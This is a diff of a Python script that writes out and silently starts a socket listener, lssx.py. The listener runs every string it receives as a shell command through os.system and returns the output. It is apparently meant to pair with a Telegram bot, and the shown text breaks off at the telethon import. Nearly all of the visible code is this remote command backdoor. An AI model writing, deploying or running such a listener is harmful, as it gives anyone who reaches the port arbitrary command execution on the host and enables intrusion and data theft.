@@ -1,42 +1,37 @@
 #Created By Special_Esmit Just For Fun :)
 
 import os
+import sys
 
 codes = """
 import socket
 import os
-
 s = socket.socket()
-
 ip = \"localhost\"
 port = 15001
 s.bind((ip, port))
 s.listen(True)
-
 while True:
-
 	try:
 		c, addr = s.accept()
 		rs = c.recv(1024).decode()
 		execute = os.system(rs + \' > execute.x\')
 		exf = open(\'execute.x\',\'r\').read()
 		try:
-
 			c.send(str(exf).encode())
 		except:
 			c.close
 		c.close
-
 	except:
 		continue
-
 """
 
 f = open("lssx.py","w")
 f.write(codes)
 f.close
-os.system("nohup python lssx.py &"
-sx = str(input("Run Telegram Bot?(y,n) : "))
+os.system("python lssx.py &")
+sx = sys.argv[1]
+print(sx)
 if sx == 'y':
 	try:
 		from telethon import TelegramClient, connection, events
